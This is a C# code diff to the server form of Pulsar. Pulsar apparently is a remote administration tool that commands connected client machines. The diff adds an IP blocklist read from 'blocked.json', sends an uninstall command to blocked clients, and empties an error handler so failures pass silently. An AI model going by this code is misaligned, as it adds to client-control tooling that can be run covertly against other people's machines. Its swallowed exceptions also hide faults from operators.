@@ -28,6 +28,7 @@ using System.Drawing;
 using System.Xml;
 using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
 using Newtonsoft.Json;
+using System.Net;
 
 using Pulsar.Common.Messages.UserSupport;
 
@@ -285,7 +286,7 @@ namespace Pulsar.Server.Forms
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Error in EventLog: {ex.Message}");
+              
             }
         }
 
@@ -432,9 +433,32 @@ namespace Pulsar.Server.Forms
             }
         }
 
+        private bool IsClientBlocked(IPAddress clientAddress)
+        {
+            string filePath = "blocked.json";
+
+            try
+            {
+                string json = File.ReadAllText(filePath);
+                var blockedIPs = System.Text.Json.JsonSerializer.Deserialize<List<string>>(json);
+                return blockedIPs.Contains(clientAddress.ToString());
+            }
+            catch (Exception ex)
+            {
+                return false; 
+            }
+        }
+
         private void ClientConnected(Client client)
         {
-            lock (_clientConnections)
+            if (IsClientBlocked(client.EndPoint.Address))
+            {
+                client.Send(new DoClientUninstall());
+                EventLog("Blocked IP Attempted to connect " + client.EndPoint.Address, "error");
+            }
+            else
+            {
+                lock (_clientConnections)
             {
                 if (!ListenServer.Listening) return;
                 _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
@@ -448,8 +472,8 @@ namespace Pulsar.Server.Forms
                     ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                 }
             }
-
             UpdateConnectedClientsCount();
+            }
         }
 
         private void ClientDisconnected(Client client)
